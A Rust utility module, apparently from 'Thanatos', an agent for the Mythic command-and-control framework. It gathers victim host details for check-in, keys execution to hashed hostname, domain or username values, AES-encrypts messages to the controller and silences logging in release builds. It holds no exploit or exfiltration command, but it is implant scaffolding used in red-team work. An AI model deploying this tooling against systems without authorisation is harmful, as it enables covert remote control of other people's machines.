#![warn(missing_docs)]
#![warn(clippy::missing_docs_in_private_items)]

//! Utilities for the agent shared across each library.
//! Mostly contains Windows/Linux specific wrappers which are commonly used

#[cfg(target_os = "linux")]
pub mod linux;

#[cfg(target_os = "windows")]
pub mod windows;

pub mod cmddefs;
pub mod crypto;
pub mod errors;
pub mod msg;

use std::time::Duration;

use errors::ThanatosError;
use serde::{Deserialize, Serialize};

/// Info for the initial check in
#[derive(Serialize, Debug)]
pub struct CheckinInfo {
    /// Internal IP addresss of the agent
    ips: Option<Vec<String>>,

    /// OS name and version of the agent
    os: String,

    /// Username associated with the current callback
    user: Option<String>,

    /// Hostname associated with the current callback
    host: Option<String>,

    /// Current process ID of the callback
    pid: u32,

    /// Architecture of the callback
    architecture: String,

    /// Domain name associated with the callback
    domain: Option<String>,

    /// Integrity level of the callback
    integrity_level: u32,

    /// Current process name
    process_name: Option<String>,
}

/// Guard rails for checking if the domain, username or hostname matches the configured guardrails
#[cfg(any(feature = "hostname", feature = "domain", feature = "username"))]
pub mod guards {
    use crate::crypto;

    #[cfg(target_os = "linux")]
    use crate::linux as native;

    #[cfg(target_os = "windows")]
    use crate::windows as native;

    /// Gets the current hostname as a sh256 hash and compares it to the configured hostname guard
    #[cfg(feature = "hostname")]
    pub fn check_hostname_guard() -> bool {
        let hostname = match native::info::hostname() {
            Ok(hostname) => hostname.to_lowercase(),
            Err(_) => return false,
        };

        if let Ok(hash) = crypto::sha256(hostname.as_bytes()) {
            hash == config::get_hostname()
        } else {
            false
        }
    }

    /// Gets the current domain name as a sha256 hash and compares it to the configured domain name
    /// guard
    #[cfg(feature = "domain")]
    pub fn check_domain_guard() -> bool {
        let domain_name = match native::info::domain() {
            Ok(domain_name) => domain_name.to_lowercase(),
            Err(_) => return false,
        };

        if let Ok(hash) = crypto::sha256(domain_name.as_bytes()) {
            hash == config::get_domain()
        } else {
            false
        }
    }

    /// Gets the current username as a sha256 hash and compares it to the configured user name
    /// guard
    #[cfg(feature = "username")]
    pub fn check_username_guard() -> bool {
        let username = match native::info::username() {
            Ok(username) => username.to_lowercase(),
            Err(_) => return false,
        };

        if let Ok(hash) = crypto::sha256(username.as_bytes()) {
            hash == config::get_username()
        } else {
            false
        }
    }
}

/// Gets the current POSIX timestamp
pub fn get_timestamp() -> Duration {
    match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
        Ok(t) => t,

        // This shouldn't happen since the `duration_since` is literally 0.
        Err(e) => e.duration(),
    }
}

/// Gets the check in info depending on the compile target
pub fn get_checkin_info() -> CheckinInfo {
    #[cfg(target_os = "linux")]
    return linux::checkin_info();

    #[cfg(target_os = "windows")]
    return windows::checkin_info();
}

/// Get the amount of time that has elapsed since midnight
pub fn get_timeofday() -> Duration {
    #[cfg(target_os = "linux")]
    return linux::get_timeofday();

    #[cfg(target_os = "windows")]
    return windows::get_timeofday();
}

/// Creates a message for Mythic with AES encryption
/// * uuid - UUID of the agent
/// * data - Data to formulate the message from
/// * aeskey - AES key to use for encryption
#[cfg(any(feature = "AES", feature = "EKE"))]
pub fn formulate_message_with_key<T: Serialize>(
    uuid: impl AsRef<str>,
    data: T,
    aeskey: &[u8; 32],
) -> Result<String, ThanatosError> {
    let serialized = serde_json::to_string(&data).map_err(|_| ThanatosError::JsonEncodeError)?;
    let encrypted = crypto::encrypt_aes(aeskey, serialized)?;

    Ok(crate::crypto::b64encode(
        [uuid.as_ref().as_bytes(), &encrypted].concat(),
    ))
}

/// Creates a message for Mythic without AES encryption
#[cfg(not(feature = "AES"))]
pub fn formulate_message<T: Serialize>(
    uuid: impl AsRef<str>,
    data: T,
) -> Result<String, ThanatosError> {
    let json_data = serde_json::to_string(&data).map_err(|_| ThanatosError::JsonEncodeError)?;
    Ok(crate::crypto::b64encode(format!(
        "{}{}",
        uuid.as_ref(),
        json_data
    )))
}

/// Extracts the message from Mythic and AES decrypts it
/// * data - Data to extract the message from
/// * aeskey - AES key to use for decrypting the data
#[cfg(any(feature = "AES", feature = "EKE"))]
pub fn extract_message_with_key<T: for<'a> Deserialize<'a>>(
    data: String,
    aeskey: &[u8; 32],
) -> Result<T, ThanatosError> {
    let decoded = debug_invoke!(crate::crypto::b64decode(data));
    let decrypted = debug_invoke!(crypto::decrypt_aes_verify(aeskey, &decoded[36..]));

    let deserialized: T = debug_invoke!(
        serde_json::from_slice(&decrypted),
        ThanatosError::JsonDecodeError
    );

    Ok(deserialized)
}

/// Extracts the message from Mythic
/// * data - Data to extract the message from
#[cfg(not(feature = "AES"))]
pub fn extract_message<T: for<'a> Deserialize<'a>>(data: String) -> Result<T, ThanatosError> {
    let decoded = debug_invoke!(crate::crypto::b64decode(data));

    let deserialized: T = debug_invoke!(
        serde_json::from_slice(&decoded[36..]),
        ThanatosError::JsonDecodeError
    );

    Ok(deserialized)
}

/// Logging info for debugging
/// * $val - Statement to log
/// * $fmt - Format specifier for the log message
/// * $($args)* - Arguments for the format specified
///
/// Examples:
/// log!("Foo");
/// log!("{}", 1 + 2);
/// log!("Err: {:?}", thing);
#[cfg(debug_assertions)]
#[macro_export]
macro_rules! log {
    ($val:expr) => {
        println!("[{}:{}]: {}", std::file!(), std::line!(), $val);
    };

    ($fmt:expr, $($args:tt)*) => {
        println!("[{}:{}]: {}", std::file!(), std::line!(), std::format_args!($fmt, $($args)*))
    };
}

/// Logging info for release. Doesn't do anything
#[cfg(not(debug_assertions))]
#[macro_export]
macro_rules! log {
    ($val:expr) => {};

    ($fmt:expr, $($args:tt)*) => {};
}

/// Tries to invoke a function which returns a result and panics if it fails
/// * $func - Function to invoke which returns a result
/// * $err - Error type to map any error to
/// * $cb - Code block to invoke as a callback if the function errors
///
/// Examples:
/// let res = debug_invoke!(foo);
/// let res = debug_invoke!(foo, ThanatosError::Foo);
/// let res = debug_invoke!(foo, { log!("Something went wrong") });
/// let res = debug_invoke!(foo, ThanatosError::Foo, { log!("Something went wrong") });
#[cfg(debug_assertions)]
#[macro_export]
macro_rules! debug_invoke {
    ($func:expr) => {
        $func.unwrap()
    };

    ($func:expr, $err:expr) => {
        $func.unwrap()
    };

    ($func:expr, $cb:block) => {
        $func;
        $cb;
    };

    ($func:expr, $err:expr, $cb:block) => {
        match $func {
            Ok(v) => v,
            Err(_) => {
                $cb;
                return Err($err);
            }
        }
    };
}

/// Tries to invoke a function which returns a result and panics if it fails
/// * $func - Function to invoke which returns a result
/// * $err - Error type to map any error to
/// * $cb - Code block to invoke as a callback if the function errors
///
/// Examples:
/// let res = debug_invoke!(foo);
/// let res = debug_invoke!(foo, ThanatosError::Foo);
/// let res = debug_invoke!(foo, { log!("Something went wrong") });
/// let res = debug_invoke!(foo, ThanatosError::Foo, { log!("Something went wrong") });
#[cfg(not(debug_assertions))]
#[macro_export]
macro_rules! debug_invoke {
    ($func:expr) => {
        $func?
    };

    ($func:expr, $err:expr) => {
        $func.map_err(|_| $err)?
    };

    ($func:expr, $cb:block) => {
        $func?
    };

    ($func:expr, $err:expr, $cb:block) => {
        $func.map_err(|_| $err)?
    };
}
